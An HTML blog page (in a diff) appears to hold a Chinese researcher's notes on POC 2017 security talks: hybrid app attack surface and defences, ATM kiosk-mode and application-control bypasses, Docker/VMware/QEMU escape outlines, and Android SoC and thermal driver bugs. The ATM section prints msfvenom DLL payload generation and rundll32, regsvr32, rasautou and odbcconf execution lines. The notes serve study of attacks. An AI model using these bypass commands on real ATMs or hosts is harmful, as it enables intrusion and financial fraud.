@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全大会,议题,记录,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。 http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/ 我没去参加这个会议，只是根据公开的p">
+<meta name="keywords" content="安全大会,议题,记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="POC 2017的一些要点记录">
+<meta property="og:url" content="https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。 http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/ 我没去参加这个会议，只是根据公开的p">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517899307926.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517909328007.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517901810504.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517902141588.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517902150544.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517902167392.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517902403859.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517902417171.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517967294705.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517967879898.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517967951726.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517967999937.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517968429335.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971216207.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971233376.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971307939.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971325743.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971420315.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971732198.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517971958057.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972022121.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972507572.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972659755.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972686799.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972761613.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517972788721.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517973976266.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517974073132.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517974595906.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1517974627562.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518065764684.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518065894080.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518065924903.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518066110006.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518066177583.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518227017531.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518227883953.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518228112165.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518255883382.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518256158260.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518256593518.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518256600757.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518256724068.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518256912277.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518257953049.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518257969527.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312226154.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312325773.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312504917.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312567883.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312665455.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312702652.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312839062.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518312913527.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518313029186.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518313166620.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518313243518.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518313371481.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518318927596.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319280377.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319344465.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319401786.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319444485.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319538621.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.058Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="POC 2017的一些要点记录">
+<meta name="twitter:description" content="这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。 http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/ 我没去参加这个会议，只是根据公开的p">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1517899307926.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/">
+
+
+
+
+
+  <title>POC 2017的一些要点记录 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">POC 2017的一些要点记录</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-06T00:00:00+00:00">
+                2018-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/06/POC 2017的一些要点记录/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/02/06/POC 2017的一些要点记录/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。</p>
+<p><a href="http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/">http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/</a></p>
+<p>我没去参加这个会议，只是根据公开的pdf对部分议题中有些点记录一下，不会全部议题全记录</p>
+<h1 id="Hybrid-App-SecurityAttack-and-defense"><a href="#Hybrid-App-SecurityAttack-and-defense" class="headerlink" title="Hybrid App SecurityAttack and defense"></a>Hybrid App SecurityAttack and defense</h1><p>Hybrid App（混合模式移动应用）是指介于web-app、native-app这两者之间的app，兼具“Native App良好用户交互体验的优势”和“Web App跨平台开发的优势”。</p>
+<p>Apache Cordova框架的架构</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517899307926.jpg" alt></p>
+<p><strong>白名单插件</strong></p>
+<p>1.Navigation Whitelist<br>Controls which URLs the WebView itself can be navigated to.<br><allow-navigation href="http://example.com/*"><br>2.Intent Whitelist<br>Controls which URLs the app is allowed to ask the system to open.<br><allow-intent href="http://*/*"><br>3.Network Request Whitelist<br>Controls which network requests are allowed to be made.<br><access origin="http://google.com"></access></allow-intent></allow-navigation></p>
+<p><strong>Attack Surface of Hybrid App</strong></p>
+<ul>
+<li>XSS Vulnerability</li>
+<li>Man-in-the-Middle Attack</li>
+<li>Insecure Whitelist</li>
+<li>Exported JS Bridge</li>
+<li>Incorrect URL interception</li>
+</ul>
+<p><strong>How to secure your hybrid app</strong></p>
+<ul>
+<li>use CSP to protect web app</li>
+<li>SSL Certificate Pinning</li>
+<li>Use session token to protect bridges</li>
+<li>Don’t use iframe and eval()</li>
+<li>Update your hybrid app framework to the last version</li>
+<li>Use system WebView for outside links</li>
+<li>Validate all user input</li>
+<li>Remove unused plugins</li>
+</ul>
+<h1 id="Launch-Impossible-Current-State-of-Application-Control-Bypasses-on-ATMs"><a href="#Launch-Impossible-Current-State-of-Application-Control-Bypasses-on-ATMs" class="headerlink" title="Launch Impossible  Current State of Application Control Bypasses on ATMs."></a>Launch Impossible  Current State of Application Control Bypasses on ATMs.</h1><p><strong>Kiosk mode bypass</strong></p>
+<p>应该可以简单地理解为全屏模式？</p>
+<p>•Safe mode<br>•Hotkeys (Win+R Alt+Tab Alt+F4 Alt+Shift+ESC F1-F12 Shift x5 (Windows 7 only) Win+(etc))<br>•Windows Plug&amp;Play<br>•Race condition<br>•Booting process</p>
+<p><strong>How to deliver malware</strong></p>
+<ul>
+<li>Code execution in trusted apps (cmd, powershell)</li>
+<li>Hash collisions</li>
+<li>Bypassing extensions blacklist</li>
+<li>Another trusted applications (.NET, Java, PHP, etc)</li>
+<li>Misconfiguration (DLL)</li>
+<li>Exploits</li>
+</ul>
+<p>Fuzzing trusted apps</p>
+<ul>
+<li>for /f %%i in (C:\commands.txt) do cmd /C %%i /? &gt;&gt; log.txt</li>
+</ul>
+<p>msfvenom -p windows/exec CMD=calc -f dll -o /tmp/<br>xek.dll</p>
+<ul>
+<li>rundll32 C:\xek.dll,@DllMain</li>
+<li>regsvr32 /s /u xek.dll (call DllUnregisterServer)</li>
+<li>DLL hijacking</li>
+<li>rasautou -d C:\xek.dll -p @DllMain12 -e 1</li>
+<li>odbcconf /a {REGSVR “C:\xek.dll”}</li>
+</ul>
+<p>还是有很多懒得记录。。。</p>
+<h1 id="An-awesome-toolkit-for-testing-the-virtualization-system"><a href="#An-awesome-toolkit-for-testing-the-virtualization-system" class="headerlink" title="An awesome toolkit for testing the virtualization system"></a>An awesome toolkit for testing the virtualization system</h1><p><strong>tool-1 side channel attack</strong><br>This basic principle of this tool is ，When the Central Processing<br>Unit （CPU） handles atomic instructions, memory bus will be<br>locked.</p>
+<p>The time it takes for two virtual machines to execute some<br>atomic instructions at the same time is longer than the time that a<br>virtual machine executes these code.</p>
+<p>这个应该可以判断是否是虚拟机，根据时间</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517909328007.jpg" alt></p>
+<p><strong>tool-2 escape from docker container</strong><br>我们知道docker是一个容器</p>
+<p>我们攻击的目标是命名空间（namespace），但是我们首先需要有权限提升漏洞</p>
+<p>原理：改变docker容器的bash进程的namespace</p>
+<p><a href="https://www.cnblogs.com/sammyliu/p/5878973.html" target="_blank" rel="noopener">https://www.cnblogs.com/sammyliu/p/5878973.html</a><br><a href="http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/</a></p>
+<p><img src="http://pic.giantbranch.cn/pic/1517901810504.jpg" alt></p>
+<p>tips</p>
+<ol>
+<li>Docker is reducing the number of syscall that can be called in<br>the container; so some privilege-escalation vulnerabilities can not<br>be used.</li>
+<li>Linux kernel namespace operation code is constantly being<br>modified; so the attack module also need to be constantly<br>updated.</li>
+</ol>
+<p><strong>tool-3 escape from vmware vm</strong></p>
+<p>target：vmx process</p>
+<p>原理：作者使用了6个漏洞，泄露关键信息：例如可写的全局内存，Functional registration phenomenon（这个不知怎么翻译，感觉是函数调用表），有用的数据结构和相关的区域</p>
+<p>前提：有uaf或者堆溢出漏洞</p>
+<p>特点：exp代码是通用的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517902141588.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1517902150544.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1517902167392.jpg" alt></p>
+<p><strong>tool-4 escape from qemu vm</strong></p>
+<p>QEMU is a generic and open source machine emulator and virtualizer.  The Xen-qemu<br>project is similar in code to the qemu project.  Most of the public and private<br>cloud virtual machines are based on kvm&amp;qemu and xen hypervisor platforms.</p>
+<p>目标：qemu process</p>
+<p>前提：uaf或堆溢出漏洞</p>
+<p>限制：</p>
+<ol>
+<li>没有通用的rop</li>
+<li>没有通用的堆申请代码</li>
+<li>没有通用的payload</li>
+</ol>
+<p><img src="http://pic.giantbranch.cn/pic/1517902403859.jpg" alt></p>
+<p>我们需要将漏洞拥有可读可写的能力，目的是修改tool中的代码</p>
+<p>提升成功率，需要写在驱动里</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517902417171.jpg" alt></p>
+<ol>
+<li>read function pointer in key-memory</li>
+<li>calculate the base address of qemu process</li>
+<li>change vram authority to be executable</li>
+<li>put the payload code in vram memory</li>
+<li>occupy coroutine_trampoline function pointer<br>and control rip</li>
+</ol>
+<h1 id="The-android-vulnerability-discovery-in-SoC"><a href="#The-android-vulnerability-discovery-in-SoC" class="headerlink" title="The android vulnerability discovery in SoC"></a>The android vulnerability discovery in SoC</h1><p>▶ALSA(Advanced Linux Sound Architecture)<br>ALSA provides audio-related support to the Linux kernel.<br>▶ASoC(ALSA System on Chip)<br>ASoC is a Linux kernel subsystem created to provide better ALSA<br>support for system-on-chip and portable audio codecs.</p>
+<p>架构</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517967294705.jpg" alt></p>
+<p>▶Machine driver:<br>The machine driver handles any machine specific controls and audio<br>events (e.g. turning on an amp at start of playback).<br>▶Codec Driver :<br>The codec driver is platform independent and contains audio controls,<br>audio interface capabilities, codec DAPM definition and codec I/O<br>functions.<br>▶Platform driver:<br>The platform driver contains the audio DMA engine and audio<br>interface drivers (e.g. I2S, AC97, PCM) for that platform.</p>
+<p>下面是snd_kcontrol_new 结构体</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">snd_kcontrol_new</span> &#123;</span></span><br><span class="line">    <span class="keyword">snd_ctl_elem_iface_t</span> iface; <span class="comment">/* interface identifier */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> device;   <span class="comment">/* device/client number */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subdevice;   <span class="comment">/* subdevice (substream) number */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *name; <span class="comment">/* ASCII name of item */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index;   <span class="comment">/* index of item */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> access;   <span class="comment">/* access rights */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count;   <span class="comment">/* count of same elements */</span></span><br><span class="line">    <span class="keyword">snd_kcontrol_info_t</span> *info;</span><br><span class="line">    <span class="keyword">snd_kcontrol_get_t</span> *get;</span><br><span class="line">    <span class="keyword">snd_kcontrol_put_t</span> *put;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">snd_kcontrol_tlv_rw_t</span> *c;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> *p;</span><br><span class="line">    &#125; tlv;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> private_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>结构体中这几个可以在用户空间控制声卡</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snd_kcontrol_info_t *info;</span><br><span class="line">snd_kcontrol_get_t *get;</span><br><span class="line">snd_kcontrol_put_t *put;</span><br></pre></td></tr></table></figure>
+
+<p><strong>高通SOC</strong></p>
+<p>代码片段</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">snd_ctl_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_ctl_file</span> *<span class="title">ctl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_card</span> *<span class="title">card</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_kctl_ioctl</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user *argp = (<span class="keyword">void</span> __user *)arg;</span><br><span class="line">    <span class="keyword">int</span> __user *ip = argp;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_INFO:</span><br><span class="line">         <span class="keyword">return</span> snd_ctl_elem_info_user(ctl, argp);</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_READ:</span><br><span class="line">     <span class="keyword">return</span> snd_ctl_elem_read_user(card, argp);</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_WRITE:</span><br><span class="line">     <span class="keyword">return</span> snd_ctl_elem_write_user(ctl, argp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>argp我们是可以控制的，在看看write里</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517967879898.jpg" alt></p>
+<p>继续看put</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517967951726.jpg" alt></p>
+<p>可能可以控制索引，越界访问异常</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517967999937.jpg" alt></p>
+<p><strong>Thermal Framework</strong></p>
+<p>linux就是通过这个框架管理系统的温度的</p>
+<p>The framework includes thermal zones, thermal<br>sensors,cooling devices, governors, trip points and thermal<br>instances.</p>
+<p>但是这个框架通过linux的sysfs，设备驱动的虚拟文件系统暴露了一些信息给用户空间的应用（sysfs 是 Linux 内核中设计较新的一种虚拟的基于内存的文件系统，一般挂载在linux中/sys/下，那就是/sys/下的内容）</p>
+<p>架构</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517968429335.jpg" alt></p>
+<p>▶Thermal Zone Device:<br>The thermal zone device includes a thermal sensor（热敏元件，就是温度传感器） and multiple<br>cooling devices.It represents a region managed by thermal<br>framework.<br>▶Thermal Governor:<br>The thermal governor determines cooling policy.<br>▶Thermal Cooling Device:<br>The thermal cooling device is actual functional units for cooling<br>down the thermal zone.</p>
+<p>攻击面</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971216207.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971233376.jpg" alt></p>
+<p><strong>Samsung S8 Thermal</strong></p>
+<p>我们看到循环的size</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971307939.jpg" alt></p>
+<p>但是这个size我们是可控的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971325743.jpg" alt></p>
+<p>那最终我们可以控制循环，最终可导致溢出</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971420315.jpg" alt></p>
+<p><strong>Tegra Thermal</strong></p>
+<p>tegra_throttle_cooling_ops结构</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971732198.jpg" alt></p>
+<p>里面有个set_cur_state</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517971958057.jpg" alt></p>
+<p>通过控制cur_state可能可以任意读</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972022121.jpg" alt></p>
+<p><strong>race condition in list</strong></p>
+<p>no lock protection on list operation</p>
+<ul>
+<li>simple but rare</li>
+</ul>
+<p>no lock protection on list node</p>
+<ul>
+<li>complex but common</li>
+</ul>
+<p>简单的情况</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972507572.jpg" alt></p>
+<p>那个重合的部分是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A-&gt;next = A-&gt;next-&gt;next</span><br><span class="line">B-&gt;next = LIST_POISION</span><br></pre></td></tr></table></figure>
+
+<p>就是说当左边的执行完</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A-&gt;next = A-&gt;next-&gt;next;</span><br><span class="line">B-&gt;next = LIST_POISION;</span><br></pre></td></tr></table></figure>
+
+<p>右边的再执行，那么就出问题，B-&gt;next 应该指向C，现在执行LIST_POISION</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B-&gt;next = B-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
+
